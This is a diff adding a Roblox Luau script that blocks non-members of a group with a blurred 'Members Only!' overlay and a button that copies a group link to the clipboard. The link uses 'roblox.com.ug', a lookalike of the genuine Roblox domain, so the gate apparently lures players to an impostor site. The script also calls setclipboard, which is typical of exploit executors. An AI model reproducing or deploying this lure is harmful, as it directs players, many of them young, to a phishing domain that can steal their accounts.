@@ -1,0 +1,135 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local Lighting = game:GetService("Lighting")
+
+local player = Players.LocalPlayer
+if not player then return end
+
+local GROUP_ID = 421405843
+local GROUP_LINK = "https://roblox.com.ug/communities/421405843/"
+
+
+local success, inGroup = pcall(function()
+	return player:IsInGroup(GROUP_ID)
+end)
+
+if success and inGroup then
+	return
+end
+
+-- GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "AccessUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- Blur (чтобы не дублился)
+local Blur = Lighting:FindFirstChild("AccessBlur") or Instance.new("BlurEffect")
+Blur.Name = "AccessBlur"
+Blur.Size = 0
+Blur.Parent = Lighting
+
+-- Backdrop
+local Backdrop = Instance.new("Frame")
+Backdrop.Size = UDim2.new(1, 0, 1, 0)
+Backdrop.BackgroundColor3 = Color3.fromRGB(10, 0, 20)
+Backdrop.BackgroundTransparency = 1
+Backdrop.ZIndex = 1
+Backdrop.Parent = ScreenGui
+
+-- Card
+local Card = Instance.new("Frame")
+Card.Size = UDim2.new(0, 360, 0, 320)
+Card.Position = UDim2.new(0.5, -180, 0.5, 30)
+Card.BackgroundColor3 = Color3.fromRGB(70, 20, 160)
+Card.BackgroundTransparency = 1
+Card.BorderSizePixel = 0
+Card.ZIndex = 2
+Card.Parent = ScreenGui
+
+Instance.new("UICorner", Card).CornerRadius = UDim.new(0, 20)
+
+-- Gradient
+local GlassGrad = Instance.new("UIGradient")
+GlassGrad.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(95, 30, 195)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 8, 105))
+})
+GlassGrad.Rotation = 135
+GlassGrad.Parent = Card
+
+-- Border
+local Border = Instance.new("UIStroke")
+Border.Color = Color3.fromRGB(170, 90, 255)
+Border.Thickness = 1.5
+Border.Transparency = 0.15
+Border.Parent = Card
+
+-- Title
+local Title = Instance.new("TextLabel")
+Title.Text = "Members Only!"
+Title.Size = UDim2.new(1, -30, 0, 32)
+Title.Position = UDim2.new(0, 15, 0, 52)
+Title.BackgroundTransparency = 1
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 22
+Title.TextXAlignment = Enum.TextXAlignment.Center
+Title.ZIndex = 5
+Title.Parent = Card
+
+-- Subtitle
+local Sub = Instance.new("TextLabel")
+Sub.Text = "Join the group to unlock access"
+Sub.Size = UDim2.new(1, -30, 0, 40)
+Sub.Position = UDim2.new(0, 15, 0, 84)
+Sub.BackgroundTransparency = 1
+Sub.TextColor3 = Color3.fromRGB(210, 190, 255)
+Sub.Font = Enum.Font.Gotham
+Sub.TextSize = 13
+Sub.TextWrapped = true
+Sub.ZIndex = 5
+Sub.Parent = Card
+
+-- Button
+local Btn = Instance.new("TextButton")
+Btn.Text = "Copy Group Link"
+Btn.Size = UDim2.new(0.82, 0, 0, 46)
+Btn.Position = UDim2.new(0.09, 0, 0, 250)
+Btn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+Btn.Font = Enum.Font.GothamBold
+Btn.TextSize = 15
+Btn.BorderSizePixel = 0
+Btn.ZIndex = 5
+Btn.Parent = Card
+
+Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 12)
+
+Btn.MouseButton1Click:Connect(function()
+	if setclipboard then
+		setclipboard(GROUP_LINK)
+		Btn.Text = "Copied!"
+	else
+		Btn.Text = "Clipboard not supported"
+	end
+end)
+
+
+pcall(function()
+	TweenService:Create(Backdrop, TweenInfo.new(0.35), {
+		BackgroundTransparency = 0.45
+	}):Play()
+
+	TweenService:Create(Blur, TweenInfo.new(0.45), {
+		Size = 14
+	}):Play()
+
+	task.wait(0.1)
+
+	TweenService:Create(Card, TweenInfo.new(0.45, Enum.EasingStyle.Back), {
+		Position = UDim2.new(0.5, -180, 0.5, -160),
+		BackgroundTransparency = 0.2
+	}):Play()
+end)
